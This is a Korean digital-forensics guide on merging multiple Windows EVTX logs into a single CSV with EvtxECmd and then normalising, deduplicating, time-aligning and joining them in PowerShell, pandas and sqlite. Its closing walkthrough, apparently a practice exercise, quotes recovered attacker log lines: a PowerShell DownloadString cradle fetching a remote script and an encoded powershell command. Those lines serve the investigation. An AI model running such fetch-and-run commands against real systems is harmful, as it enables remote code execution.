---
id: FOR-0107
title: "여러 EVTX를 하나의 CSV로 합치기: 채널 통합·컬럼 정규화·sqlite 조인"
slug: "merge-evtx-csv"
category: "Event Log"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows]
artifact: ["EVTX", "Security.evtx", "System.evtx", "ForwardedEvents", "winevt/Logs"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs", "C:\\case\\out\\all.csv"]
registry_paths: []
event_ids: []
protocols: []
tools: ["EvtxECmd", "Timeline Explorer", "PowerShell", "sqlite3", "Python"]
commands: ["EvtxECmd.exe -d 'C:\\case\\winevt' --csv 'C:\\case\\out' --csvf all.csv", "sqlite3 case.db \".import --csv C:/case/out/all.csv evtx\"", "Import-Csv 'C:\\case\\out\\all.csv' | Group-Object Channel | Select-Object Name, Count"]
regex_patterns: []
wireshark_filters: []
tshark_fields: []
log_fields: ["TimeCreated", "Channel", "EventRecordId", "EventId", "Computer", "UserName", "Payload", "MapDescription", "SourceFile", "Provider"]
file_formats: ["evtx", "csv", "sqlite"]
primary_terms: ["EVTX CSV 합치기", "여러 evtx 통합", "이벤트 로그 병합"]
keywords: ["EVTX", "CSV", "합치기", "병합", "merge", "EvtxECmd", "-d", "Channel", "Import-Csv", "pandas", "sqlite3", "Timeline Explorer", "중복 제거", "UTC"]
aliases: ["evtx 여러개 합치기", "이벤트로그 csv 병합", "evtxecmd 폴더 전체", "채널 합쳐서 보기", "csv 하나로 만들기", "sqlite로 로그 조인"]
symptom_keywords: ["여러 evtx를 한 번에 보고 싶다", "채널마다 컬럼이 달라서 합쳐지지 않는다", "CSV가 너무 커서 안 열린다", "같은 이벤트가 두 번 나온다", "SQL로 조인하고 싶다", "시각 기준이 섞였다"]
related: ["FOR-0050", "FOR-0103", "FOR-0108"]
source_ids: ["SRC-004", "SRC-026", "SRC-011"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`EvtxECmd.exe -d <폴더> --csv <출력> --csvf all.csv` 하나로 winevt 폴더 전체를 한 CSV에 담고, **`Channel` 컬럼으로 채널을 구분하며 `Payload` 원본 JSON을 반드시 보존**한 뒤, 전부 UTC로 두고 같은 초는 채널별 `EventRecordId` 로 정렬한다 — 조인이 필요하면 그 CSV를 sqlite에 넣는 순간 SQL로 해결된다.

## 어떤 문제에서 필요한가

- 첨부에 evtx가 10개 이상 있고 어느 채널에 답이 있는지 모르는 문제
- Security와 PowerShell/Operational을 넘나들며 인과를 이어야 하는 문제
- Logon ID·PID·IP로 **여러 채널을 조인**해야 하는 문제
- 수백만 행이라 Excel이 열리지 않는 문제
- 같은 이벤트가 두 번 보여 개수 집계가 틀리는 문제

디스크 artifact(`$MFT`/`$J`/Prefetch)까지 한 축에 올리는 것은 [FOR-0050](./ntfs-artifact-timeline.html)의 몫이다. **이 글은 EVTX 채널들끼리 합치는 단계**만 다룬다.

## 문제에서 처음 볼 단서

1. `winevt\Logs` 폴더가 통째로 첨부됐다 → `-d` 한 번으로 끝낸다
2. evtx가 3~5개만 있다 → 그래도 `-d` 로 합친다. 개별로 뽑으면 채널 간 비교가 번거롭다
3. `Archive-Security-*.evtx` 가 함께 있다 → **중복 레코드가 생긴다.** 3단계의 중복 제거 필수
4. `ForwardedEvents.evtx` 가 있다 → 다른 호스트의 이벤트가 섞여 있다. `Computer` 로 분리
5. 파일 크기 합이 수백 MB다 → `--inc` 로 이벤트를 먼저 좁히거나 sqlite로 간다

## 30초 절차

```powershell
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv
```

바로 채널 분포를 확인한다. **어느 채널에 몇 건이 있는지가 다음 행동을 정한다.**

```powershell
Import-Csv 'C:\case\out\all.csv' |
  Group-Object Channel |
  Sort-Object Count -Descending |
  Select-Object Name, Count | Format-Table -AutoSize
```

출력 예시:

```text
Name                                                     Count
Security                                                 82364
Microsoft-Windows-Sysmon/Operational                     41120
System                                                   12844
Microsoft-Windows-PowerShell/Operational                  3418
Microsoft-Windows-TerminalServices-LocalSessionManager/Operational  214
Microsoft-Windows-TaskScheduler/Operational                 188
Windows PowerShell                                          142
```

## 상세 절차

### 1단계 — 한 번에 뽑는다

```powershell
# 폴더 전체를 하나의 CSV 로
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv

# 파일 하나만
EvtxECmd.exe -f 'C:\case\winevt\Security.evtx' --csv 'C:\case\out' --csvf sec.csv

# 용량이 클 때 이벤트를 먼저 좁힌다 (쉼표 구분)
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf core.csv --inc 4624,4625,4634,4648,4672,4688,4697,4720,4732,1102,7045,4104,4103

# 필요 없는 이벤트를 빼는 방향
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf noisefree.csv --exc 5379,4798,5058,5061
```

| 옵션 | 역할 | 주의 |
| --- | --- | --- |
| `-f <파일>` | 파일 하나 | 채널 하나만 필요할 때 |
| `-d <폴더>` | 폴더 전체 재귀 | **기본 선택.** 하위 폴더까지 훑는다 |
| `--csv <폴더>` | 출력 폴더 | 파일이 아니라 폴더다 |
| `--csvf <파일명>` | 출력 파일명 지정 | 지정하지 않으면 타임스탬프가 붙은 이름이 생긴다 |
| `--inc <ID,ID>` | 지정한 Event ID만 | **gap 판정용 CSV에는 쓰지 않는다** (FOR-0103) |
| `--exc <ID,ID>` | 지정한 Event ID 제외 | 노이즈 제거 |
| `--json` / `--xml` | JSON/XML 출력 | payload를 구조로 다뤄야 할 때 |

EvtxECmd는 **동일 파일 중복 처리를 방지하는 옵션과 날짜 범위 필터 옵션**을 함께 제공한다. 옵션 이름은 버전에 따라 다르므로 `EvtxECmd.exe` 를 인자 없이 실행해 도움말을 먼저 본다.

### 2단계 — 채널마다 컬럼이 달라 어긋나는 문제

EvtxECmd는 채널이 달라도 **같은 상위 스키마**로 내보낸다. 문제가 되는 것은 payload를 펼친 컬럼이다.

| 컬럼 | 채널에 관계없이 채워지나 | 성질 |
| --- | --- | --- |
| `RecordNumber` / `EventRecordId` | 채워진다 | 채널 내부 순번 |
| `TimeCreated` | 채워진다 | **UTC** |
| `EventId` | 채워진다 | 이벤트 종류 |
| `Level` / `Provider` / `Channel` / `Computer` | 채워진다 | 채널 판별의 근거 |
| `MapDescription` | **맵 파일이 있는 이벤트만** | 없으면 빈 값. 없다고 이벤트가 이상한 것이 아니다 |
| `UserName` / `RemoteHost` | 맵이 뽑아 준 이벤트만 | 편의 컬럼. 신뢰하지 말고 payload로 확인 |
| `PayloadData1` ~ `PayloadData6` | 맵마다 **다른 필드가 들어간다** | **채널·이벤트마다 의미가 다르다.** 여기로 필터하면 틀린다 |
| `Payload` | 항상 채워진다 | **원본 EventData의 JSON.** 이것이 진짜 데이터다 |
| `SourceFile` | 채워진다 | 어느 evtx에서 왔는지 |

**규칙 하나로 정리한다: 필터와 조인은 `Payload` 로 하고, `PayloadData*` 는 눈으로 훑을 때만 쓴다.**

`PayloadData1` 이 4624에서는 Logon Type을, 7045에서는 서비스 이름을 담는다. 같은 컬럼에 다른 의미가 들어가므로 이 컬럼으로 필터한 결과는 채널이 섞이면 무의미하다.

공통 컬럼만 남긴 정규화 CSV를 하나 만들어 두면 이후 작업이 전부 쉬워진다.

```powershell
Import-Csv 'C:\case\out\all.csv' |
  Select-Object @{n='TimeUTC';   e={ $_.TimeCreated }},
                @{n='Channel';   e={ $_.Channel }},
                @{n='RecordId';  e={ $_.EventRecordId }},
                @{n='EventId';   e={ $_.EventId }},
                @{n='Computer';  e={ $_.Computer }},
                @{n='Provider';  e={ $_.Provider }},
                @{n='User';      e={ $_.UserName }},
                @{n='Summary';   e={ $_.MapDescription }},
                @{n='Payload';   e={ $_.Payload }},
                @{n='SourceFile';e={ $_.SourceFile }} |
  Export-Csv -NoTypeInformation -Encoding UTF8 'C:\case\out\evtx_norm.csv'
```

컬럼명은 EvtxECmd 버전에 따라 다르다. 스크립트 전에 실제 헤더를 본다.

```powershell
Import-Csv 'C:\case\out\all.csv' | Select-Object -First 1 | Get-Member -MemberType NoteProperty
```

### 3단계 — 중복 제거

같은 이벤트가 두 번 이상 나오는 원인은 네 가지다. **원인에 따라 지우는 방법이 다르다.**

| 원인 | 어떻게 보이나 | 처리 |
| --- | --- | --- |
| 같은 채널의 백업 파일 (`Archive-Security-*.evtx`) | `Channel` + `EventRecordId` 가 완전히 동일한 행 | **진짜 중복.** 그 키로 제거 |
| 폴더에 같은 파일이 두 벌 (복사본) | `SourceFile` 만 다르고 나머지 동일 | 진짜 중복. 제거 |
| `ForwardedEvents` 채널 | `Computer` 가 다른 호스트인 행이 섞임 | **중복이 아니다.** `Computer` 로 분리해서 본다 |
| 같은 사건이 서로 다른 채널에 기록 | 4697(Security) ↔ 7045(System), PowerShell 4103/4104(Operational) ↔ 400/403/600(Windows PowerShell) | **중복이 아니다.** 교차검증 재료로 남긴다 |

```powershell
# 진짜 중복 제거: Channel + EventRecordId 가 같으면 같은 레코드다
$rows = Import-Csv 'C:\case\out\evtx_norm.csv'
$seen = @{}
$dedup = foreach ($r in $rows) {
  $k = '{0}|{1}' -f $r.Channel, $r.RecordId
  if (-not $seen.ContainsKey($k)) { $seen[$k] = $true; $r }
}
'{0} -> {1} rows' -f $rows.Count, $dedup.Count
$dedup | Export-Csv -NoTypeInformation -Encoding UTF8 'C:\case\out\evtx_dedup.csv'
```

```powershell
# 중복이 어디서 왔는지 먼저 확인한다 (무작정 지우지 않는다)
Import-Csv 'C:\case\out\evtx_norm.csv' |
  Group-Object Channel, RecordId |
  Where-Object { $_.Count -gt 1 } |
  Select-Object -First 10 @{n='Key';e={$_.Name}}, Count,
                          @{n='Files';e={ ($_.Group.SourceFile | Sort-Object -Unique) -join ' | ' }}
```

`Files` 컬럼에 `Security.evtx` 와 `Archive-Security-2026-03-13-...evtx` 가 함께 나오면 백업 파일 중복이 확정이다.

### 4단계 — 시각 기준 통일 (가장 중요)

**원칙: 전부 UTC로 두고, 마지막 답 단계에서만 KST로 바꾼다.**

| 값 | 기준 |
| --- | --- |
| EVTX `System/TimeCreated/@SystemTime` | **UTC** (100ns 정밀도) |
| EvtxECmd CSV `TimeCreated` | UTC |
| Event Viewer 화면 표시 | **로컬 시간대로 변환된 값** |
| `Get-WinEvent` 의 `TimeCreated` 속성 | 로컬 `DateTime` 객체 (`.ToUniversalTime()` 필요) |
| 텍스트 로그(IIS·앱 로그) | 로그마다 다르다. 섞을 때만 별도 보정 |

```text
KST = UTC + 9시간
```

여기서 사고가 나는 지점이 하나 있다. **`Get-WinEvent` 는 로컬 시각을, EvtxECmd CSV는 UTC를 준다.** 두 방법의 결과를 같은 표에 올리면 9시간 어긋난다.

```powershell
# Get-WinEvent 결과를 UTC 로 맞춘다
Get-WinEvent -Path 'C:\case\Security.evtx' -Oldest |
  Select-Object @{n='TimeUTC';e={ $_.TimeCreated.ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ss.fffffffZ') }},
                RecordId, Id, ProviderName

# 완성된 CSV 에 KST 컬럼을 덧붙인다 (답 제출용)
Import-Csv 'C:\case\out\evtx_dedup.csv' |
  Select-Object *, @{n='TimeKST';e={ ([datetime]$_.TimeUTC).AddHours(9).ToString('yyyy-MM-dd HH:mm:ss') }} |
  Export-Csv -NoTypeInformation -Encoding UTF8 'C:\case\out\evtx_kst.csv'
```

### 5단계 — 같은 초 정렬은 채널별 EventRecordId 로

합친 CSV를 `TimeCreated` 로만 정렬하면 같은 초에서 순서가 무작위가 된다. 정렬 키는 **`Channel` → `TimeUTC` → `RecordId`** 순이다.

```powershell
Import-Csv 'C:\case\out\evtx_dedup.csv' |
  Sort-Object @{e={ [datetime]$_.TimeUTC }}, @{e={ $_.Channel }}, @{e={ [int64]$_.RecordId }} |
  Select-Object TimeUTC, Channel, RecordId, EventId, User, Summary |
  Export-Csv -NoTypeInformation -Encoding UTF8 'C:\case\out\evtx_sorted.csv'
```

`RecordId` 는 **같은 채널 안에서만** 의미가 있다. 채널이 다른 두 행의 순서는 번호로 정할 수 없다. 그 판정 규칙은 FOR-0103에 있다.

### 6단계 — 방법 세 가지 비교

| 방법 | 적정 규모 | 강점 | 약점 |
| --- | --- | --- | --- |
| PowerShell `Import-Csv` | 수만 행 | 추가 설치 없음. 즉시 시작 | 전부 메모리에 올린다. 수십만 행부터 급격히 느려짐 |
| Python `pandas` | 수백만 행 | 그룹핑·피벗·조인이 짧다 | 메모리 사용량. dtype 지정 안 하면 값이 변형된다 |
| `sqlite3` | 수백만 행 이상 | **SQL 조인·인덱스.** 반복 질의가 빠르다 | 한 번 넣는 수고가 필요 |
| Timeline Explorer | 수십만 행 | 컬럼 필터·태깅·북마크가 즉시 | 조인은 못 한다 |

실전 판단: **행이 10만 미만이면 PowerShell, 그 이상이고 조인이 필요하면 sqlite, 집계·통계가 필요하면 pandas.**

#### 6-1. PowerShell

```powershell
$rows = Import-Csv 'C:\case\out\evtx_dedup.csv'

# 채널 x 이벤트 분포
$rows | Group-Object Channel, EventId | Sort-Object Count -Descending |
  Select-Object -First 25 Name, Count

# 사건 시각 창으로 좁힌다 (UTC)
$rows | Where-Object {
  ([datetime]$_.TimeUTC) -ge [datetime]'2026-03-14T07:15:00Z' -and
  ([datetime]$_.TimeUTC) -le [datetime]'2026-03-14T08:00:00Z'
} | Sort-Object @{e={[datetime]$_.TimeUTC}}, @{e={[int64]$_.RecordId}} |
  Format-Table TimeUTC, Channel, EventId, User, Summary -AutoSize
```

#### 6-2. Python (pandas)

```python
import glob
import pandas as pd

files = glob.glob(r'C:\case\out\*.csv')

# dtype=str 를 반드시 준다. 안 주면 0x1a2b3c 가 NaN 이 되거나
# 큰 정수가 float 으로 바뀌어 EventRecordId 가 망가진다
frames = [pd.read_csv(f, dtype=str, encoding='utf-8-sig', low_memory=False) for f in files]

# 채널마다 컬럼 집합이 다르면 교집합만 남긴다
common = set(frames[0].columns)
for fr in frames[1:]:
    common &= set(fr.columns)
common = [c for c in frames[0].columns if c in common]

df = pd.concat([fr[common] for fr in frames], ignore_index=True)

# 진짜 중복 제거
df = df.drop_duplicates(subset=['Channel', 'EventRecordId'])

# 정렬: 시각 -> 채널 -> 레코드 번호
df['_t'] = pd.to_datetime(df['TimeCreated'], utc=True, errors='coerce')
df['_r'] = pd.to_numeric(df['EventRecordId'], errors='coerce')
df = df.sort_values(['_t', 'Channel', '_r'])

# KST 컬럼 (제출용)
df['TimeKST'] = df['_t'].dt.tz_convert('Asia/Seoul').dt.strftime('%Y-%m-%d %H:%M:%S')

print(df.groupby(['Channel', 'EventId']).size().sort_values(ascending=False).head(25))
df.drop(columns=['_t', '_r']).to_csv(r'C:\case\out\evtx_merged.csv', index=False, encoding='utf-8-sig')
```

`dtype=str` 을 빠뜨리면 pandas가 `EventRecordId` 를 float로 읽어 큰 값의 마지막 자리가 바뀐다. **정렬 근거가 조용히 망가지는 사고**다.

#### 6-3. sqlite3 — 조인이 필요하면 이것

```bash
# 최신 sqlite3 (CSV 모드 플래그 지원)
sqlite3 case.db ".import --csv C:/case/out/evtx_dedup.csv evtx"

# 구버전 문법
sqlite3 case.db
```

```sql
.mode csv
.headers on
.import C:/case/out/evtx_dedup.csv evtx

-- 조회를 빠르게 (반복 질의 전에 반드시)
CREATE INDEX idx_ch_rec ON evtx(Channel, RecordId);
CREATE INDEX idx_time   ON evtx(TimeUTC);
CREATE INDEX idx_eid    ON evtx(EventId);

-- 채널 x 이벤트 분포
SELECT Channel, EventId, COUNT(*) AS n
FROM evtx GROUP BY Channel, EventId ORDER BY n DESC LIMIT 25;

-- 사건 창 안의 전 채널 이벤트를 순서대로
SELECT TimeUTC, Channel, RecordId, EventId, User, Summary
FROM evtx
WHERE TimeUTC BETWEEN '2026-03-14 07:15:00' AND '2026-03-14 08:00:00'
ORDER BY TimeUTC, Channel, CAST(RecordId AS INTEGER);

-- 시각을 KST 로 (답 제출용)
SELECT datetime(TimeUTC, '+9 hours') AS TimeKST, Channel, EventId, Summary
FROM evtx WHERE EventId IN (4624, 4688, 1102) ORDER BY TimeUTC;
```

**여기서 sqlite의 진짜 값이 나온다 — Logon ID 조인.** 정규화한 컬럼을 하나 만들어 두면 SQL 한 줄로 세션 활동이 나온다.

```sql
-- payload 에서 Logon ID 를 뽑아 별도 컬럼으로 고정한다
ALTER TABLE evtx ADD COLUMN LogonId TEXT;

UPDATE evtx
SET LogonId = lower(
  CASE
    WHEN Payload LIKE '%TargetLogonId%'  THEN substr(Payload, instr(Payload, 'TargetLogonId')  + 17, 10)
    WHEN Payload LIKE '%SubjectLogonId%' THEN substr(Payload, instr(Payload, 'SubjectLogonId') + 18, 10)
  END);
```

`substr`/`instr` 로 자르는 오프셋은 payload의 실제 표기(따옴표·공백)에 따라 달라진다. **문자열 위치로 자르는 방식은 검산이 필요하다.** 확실하게 하려면 4단계의 정규화 CSV를 만들 때 Python에서 `LogonId` 컬럼을 계산해 넣고, sqlite에는 완성된 CSV를 넣는다.

```python
# 정규화 단계에서 LogonId 컬럼을 미리 계산해 넣는 편이 안전하다
import csv, re

FIELD_RE = re.compile(r'"(?:Target|Subject)LogonId"\s*:\s*"?(0x[0-9a-fA-F]+)', re.I)

with open(r'C:\case\out\evtx_dedup.csv', encoding='utf-8-sig', newline='') as fin, \
     open(r'C:\case\out\evtx_sql.csv', 'w', encoding='utf-8', newline='') as fout:
    rd = csv.DictReader(fin)
    cols = rd.fieldnames + ['LogonIdHex', 'LogonIdDec']
    wr = csv.DictWriter(fout, fieldnames=cols)
    wr.writeheader()
    for row in rd:
        m = FIELD_RE.search(row.get('Payload') or '')
        row['LogonIdHex'] = m.group(1).lower() if m else ''
        row['LogonIdDec'] = str(int(m.group(1), 16)) if m else ''
        wr.writerow(row)
```

```sql
-- 이제 세션 활동이 SQL 한 줄이다
SELECT TimeUTC, Channel, EventId, User, Summary
FROM evtx_sql
WHERE LogonIdDec = 1715004                    -- 0x1a2b3c
ORDER BY TimeUTC, Channel, CAST(RecordId AS INTEGER);

-- 세션별 활동량 랭킹 (예약 세션 제외)
SELECT LogonIdHex, COUNT(*) AS n, MIN(TimeUTC) AS first, MAX(TimeUTC) AS last
FROM evtx_sql
WHERE LogonIdHex <> '' AND LogonIdHex NOT IN ('0x3e7','0x3e5','0x3e4','0x0')
GROUP BY LogonIdHex ORDER BY n DESC LIMIT 20;

-- 채널 교차 조인: 4688 이 있는 시각의 PowerShell 4104
SELECT a.TimeUTC AS proc_time, a.Summary AS proc, b.TimeUTC AS ps_time, b.Summary AS script
FROM evtx_sql a
JOIN evtx_sql b
  ON b.Channel = 'Microsoft-Windows-PowerShell/Operational'
 AND b.EventId = '4104'
 AND ABS(strftime('%s', b.TimeUTC) - strftime('%s', a.TimeUTC)) <= 5
WHERE a.Channel = 'Security' AND a.EventId = '4688'
  AND a.Summary LIKE '%powershell%'
ORDER BY a.TimeUTC;
```

sqlite의 날짜 함수는 `YYYY-MM-DD HH:MM:SS` 형태의 문자열을 기대한다. CSV의 시각 표기가 `2026-03-14T07:19:02.4718235Z` 처럼 ISO 8601이면 `strftime` 이 동작하지 않을 수 있으므로, 넣기 전에 `T` 와 `Z` 를 정리하거나 `replace()` 로 감싼다.

### 7단계 — Timeline Explorer 활용

합친 CSV를 Timeline Explorer로 열면 조인은 못 하지만 탐색이 가장 빠르다.

| 하고 싶은 것 | 방법 |
| --- | --- |
| 채널 하나만 | `Channel` 컬럼 필터 |
| 사건 시각 창 | `TimeUTC` 컬럼 필터에 `2026-03-14 07:3` 같은 부분 문자열 |
| 특정 Logon ID | `Payload` 컬럼 필터에 `0x1a2b3c` |
| 이벤트 종류 묶음 | `EventId` 컬럼 필터 |
| 중요 행 표시 | 행 태깅/북마크 후 태그된 행만 보기 |
| 결과 저장 | 필터 적용 상태를 CSV/Excel로 내보내기 |

### 8단계 — 대용량 전략

| 규모 | 전략 |
| --- | --- |
| ~10만 행 | 그대로 PowerShell / Timeline Explorer |
| 10만~100만 행 | `--inc` 로 이벤트 축소 → 정규화 CSV → sqlite (인덱스 필수) |
| 100만 행 이상 | 채널별로 파일을 나눠 뽑고, 필요한 채널만 sqlite에 넣는다. Python은 `csv.DictReader` 스트리밍으로 처리 |
| Excel로 열 수 없다 | 애초에 열지 않는다. 65,536/1,048,576행 한계가 있고 큰 숫자·`0x` 문자열이 변형된다 |

```powershell
# 채널별로 나눠 뽑기 (필요한 채널만 이후 단계로)
Get-ChildItem 'C:\case\winevt\*.evtx' | ForEach-Object {
  $name = $_.BaseName -replace '[^A-Za-z0-9]', '_'
  EvtxECmd.exe -f $_.FullName --csv 'C:\case\out' --csvf "$name.csv"
}
```

**Excel로 CSV를 열어 저장하는 것이 가장 흔한 데이터 파괴 경로다.** `0x1a2b3c` 가 수식으로 해석되거나, 큰 `EventRecordId` 가 지수 표기로 바뀌거나, 앞의 0이 사라진다. 편집이 필요하면 Timeline Explorer나 텍스트 에디터를 쓴다.

## 출력 필드 해석

| 컬럼 | 쓰임 |
| --- | --- |
| `TimeCreated` / `TimeUTC` | 1차 정렬 키. **UTC** |
| `Channel` | 2차 정렬 키이자 `RecordId` 의 유효 범위 |
| `EventRecordId` / `RecordId` | 3차 정렬 키. `[int64]` 캐스팅 필수 |
| `EventId` | 필터의 주력 |
| `Computer` | 로그를 남긴 호스트. 여러 호스트를 합쳤을 때 필수 |
| `Provider` | 같은 Event ID를 다른 공급자가 쓰는 경우의 구분 |
| `Payload` | **조인과 필터의 근거.** 원본 EventData JSON |
| `MapDescription` | 사람이 읽는 요약. 없을 수 있다 |
| `UserName` / `RemoteHost` | 편의 컬럼. payload로 확인 |
| `SourceFile` | 중복 원인 추적 |

## pivot: 다음에 볼 artifact

| 여기서 얻은 것 | 다음 목표 | 무엇을 확인하나 |
| --- | --- | --- |
| 채널 분포 | 건수가 많은 채널 | 어디에 정보가 있는지 |
| 통합·정렬된 CSV | 공격 단계별 Event ID (FOR-0108) | 침해 시나리오 |
| `Payload` 의 Logon ID | 세션 조인 (FOR-0104) | 세션별 활동표 |
| `Payload` 의 PID | 프로세스 계보 (FOR-0105) | 실행 흐름 |
| `Payload` 의 IP/계정 | 3축 pivot (FOR-0106) | 공격자 단말 |
| 채널별 첫/마지막 `RecordId` | 로그 보존 구간 (FOR-0103) | 관측 가능 구간 |
| 사건 시각 창 | `$MFT` / `$J` ([FOR-0050](./ntfs-artifact-timeline.html)) | 디스크 측 사건 |
| 문자열 검색이 필요할 때 | `Select-String` ([FOR-0121](./powershell-select-string.html)) | payload 원문 grep |

## 흔한 함정

- **`PayloadData1` 로 필터하는 것.** 이 컬럼의 의미는 이벤트마다 다르다. 4624에서는 Logon Type, 7045에서는 서비스 이름이 들어간다. → 필터와 조인은 `Payload` 로 한다.
- **`Channel` 컬럼을 버리는 것.** `RecordId` 의 유효 범위가 사라지고, 정렬 근거도 사라진다. → 정규화 CSV에 반드시 남긴다.
- **`Get-WinEvent` 결과와 EvtxECmd CSV를 같은 표에 섞는 것.** 앞은 로컬 시각, 뒤는 UTC다. 9시간 어긋난다. → `ToUniversalTime()` 으로 맞춘다.
- **시각으로만 정렬하는 것.** 같은 초에서 순서가 무작위가 된다. → `TimeUTC` → `Channel` → `RecordId` 3단 정렬.
- **채널이 다른 두 행을 `RecordId` 로 비교하는 것.** 번호는 채널별로 독립이다. → 채널 간 순서는 시각과 인과로 정한다.
- **`ForwardedEvents` 를 중복으로 지우는 것.** 다른 호스트의 이벤트다. → `Computer` 로 분리해서 남긴다.
- **`Archive-*.evtx` 중복을 방치하는 것.** 개수 집계와 gap 판정이 전부 틀어진다. → `Channel` + `RecordId` 로 제거한다.
- **4697(Security)과 7045(System)를 중복으로 지우는 것.** 같은 사건의 서로 다른 기록이며 교차검증 재료다. → 남긴다.
- **pandas에서 `dtype=str` 을 빼는 것.** `EventRecordId` 가 float로 읽혀 값이 변형되고, `0x...` 값이 NaN이 된다. → 항상 `dtype=str`.
- **Excel로 CSV를 열어 다시 저장하는 것.** `0x` 값과 큰 정수가 변형된다. → Timeline Explorer를 쓴다.
- **`--inc` 로 뽑은 CSV로 gap을 판정하는 것.** 번호가 당연히 빈다. → gap 판정용은 필터 없이 별도로 뽑는다 (FOR-0103).
- **sqlite에 인덱스 없이 반복 질의하는 것.** 수백만 행에서 매 질의가 전체 스캔이다. → `Channel, RecordId` / `TimeUTC` / `EventId` 인덱스를 먼저 만든다.
- **KST 변환을 중간 단계에서 하는 것.** 일부는 UTC, 일부는 KST가 되어 정렬이 뒤집힌다. → 마지막 제출 단계에서만 +9시간.

## 교차검증

```powershell
# 1) 원본 파일 개수와 CSV 의 SourceFile 종류가 맞는가 (누락 검사)
(Get-ChildItem 'C:\case\winevt\*.evtx').Count
(Import-Csv 'C:\case\out\all.csv' | Select-Object -ExpandProperty SourceFile | Sort-Object -Unique).Count

# 2) 채널별 건수를 원본과 대조 (한 채널만 표본 검사)
(Get-WinEvent -Path 'C:\case\Security.evtx' -Oldest | Measure-Object).Count
(Import-Csv 'C:\case\out\all.csv' | Where-Object { $_.Channel -eq 'Security' } | Measure-Object).Count

# 3) 채널별 첫/마지막 레코드 번호와 시각
Import-Csv 'C:\case\out\all.csv' | Group-Object Channel | ForEach-Object {
  $g = $_.Group | Sort-Object { [int64]$_.EventRecordId }
  [pscustomobject]@{
    Channel = $_.Name; Count = $_.Count
    FirstId = $g[0].EventRecordId;  FirstTime = $g[0].TimeCreated
    LastId  = $g[-1].EventRecordId; LastTime  = $g[-1].TimeCreated
  }
} | Format-Table -AutoSize

# 4) 중복이 남아 있는가
Import-Csv 'C:\case\out\evtx_dedup.csv' | Group-Object Channel, RecordId |
  Where-Object { $_.Count -gt 1 } | Measure-Object | Select-Object Count
```

```sql
-- 5) sqlite 로 넣은 뒤 행 수가 CSV 와 같은가
SELECT COUNT(*) FROM evtx;
SELECT Channel, COUNT(*) FROM evtx GROUP BY Channel;
```

1번의 두 숫자가 다르면 파서가 읽지 못한 파일이 있다. EvtxECmd 콘솔 출력의 오류 메시지를 확인한다.

## mini walkthrough

```text
문제:
"침해 호스트에서 수집한 winevt 폴더입니다.
 PowerShell 로 실행된 다운로더의 URL 과 그 직전 프로세스 생성 시각을
 KST 로 답하세요.
 첨부: winevt/ (evtx 14개, 합 412MB)"

1. 한 번에 뽑는다
   EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv
   -> 1,384,902 행

2. 첫 시도 (실패):
   Excel 로 all.csv 를 열어 보려 했다.
   -> 100만 행이 넘어 잘리고, EventRecordId 가 1.18E+06 으로 표시됐다.
      0x1a2b3c 는 셀에 그대로 남았지만 일부 값이 날짜로 변환됐다.

   무엇이 틀렸나:
     CSV 는 Excel 로 열면 안 된다. 행 한계와 자동 형식 변환이 데이터를 바꾼다.
     이후 그 파일을 저장했다면 원본 CSV 가 오염된다.
   => all.csv 를 다시 뽑고, 이후로는 Excel 을 열지 않았다.

3. 채널 분포부터 본다
   Import-Csv out\all.csv | Group-Object Channel | Sort Count -Desc

   Security                                 82,364
   Microsoft-Windows-Sysmon/Operational  1,241,088
   System                                   12,844
   Microsoft-Windows-PowerShell/Operational  3,418
   ...

   Sysmon 이 124만 행이다. PowerShell 채널은 3,418 행 -> 여기서 시작한다.

4. 두 번째 시도 (실패):
   PowerShell 채널을 PayloadData1 로 필터해 스크립트 본문을 찾으려 했다.

   Import-Csv out\all.csv |
     Where-Object { $_.Channel -like '*PowerShell*' -and $_.PayloadData1 -match 'http' }
   -> 0건.

   무엇이 틀렸나:
     4104 의 ScriptBlockText 는 PayloadData1 에 들어가지 않는다.
     맵이 뽑아 주는 필드는 이벤트마다 다르고, 긴 본문은 Payload 에만 있다.

   Payload 로 바꾼다:
   Import-Csv out\all.csv |
     Where-Object { $_.Channel -like '*PowerShell*' -and $_.Payload -match 'http' } |
     Select-Object TimeCreated, EventId, EventRecordId
   -> 11건

5. 세 번째 시도 (실패):
   11건 중 URL 이 있는 4104 를 찾아 시각을 읽고, 그 시각으로 Security 4688 을
   찾으려 했다. 그런데 4688 이 같은 초에 3건 있어 "직전 프로세스"가 안 정해졌다.

   Sort-Object TimeCreated 로 정렬했더니 매번 순서가 달라졌다.

   무엇이 틀렸나:
     같은 초 정렬은 시각으로 안 된다. Security 채널 안에서 EventRecordId 로 정렬해야 한다.
     그리고 4104(PowerShell 채널)와 4688(Security 채널)의 순서는
     번호로 비교할 수 없다 — 채널이 다르다. 시각과 인과로 정한다.

6. 접근 변경 — sqlite 로 넣고 SQL 로 푼다
   정규화 CSV 를 만들고 (공통 컬럼 + Payload 보존)
   sqlite3 case.db ".import --csv C:/case/out/evtx_dedup.csv evtx"
   CREATE INDEX idx_ch_rec ON evtx(Channel, RecordId);
   CREATE INDEX idx_time   ON evtx(TimeUTC);

   -- URL 이 있는 4104
   SELECT TimeUTC, RecordId, substr(Payload, 1, 200)
   FROM evtx
   WHERE Channel LIKE '%PowerShell%' AND EventId='4104' AND Payload LIKE '%http%'
   ORDER BY TimeUTC;

   TimeUTC                       RecordId  ...
   2026-03-14 07:20:09           1188      ...DownloadString('http://203.0.113.77/a.ps1')...

   -- 그 시각 이전 5초 안의 Security 4688 (채널 내 번호로 정렬)
   SELECT TimeUTC, RecordId, Summary
   FROM evtx
   WHERE Channel='Security' AND EventId='4688'
     AND TimeUTC BETWEEN '2026-03-14 07:20:04' AND '2026-03-14 07:20:09'
   ORDER BY TimeUTC, CAST(RecordId AS INTEGER);

   TimeUTC              RecordId  Summary
   2026-03-14 07:20:08  1184574   powershell.exe -enc SQBFAFgA...
   2026-03-14 07:20:08  1184575   conhost.exe
   2026-03-14 07:20:08  1184576   (기타)

   RecordId 1184574 가 가장 작다 -> powershell.exe 생성이 직전 사건이다.
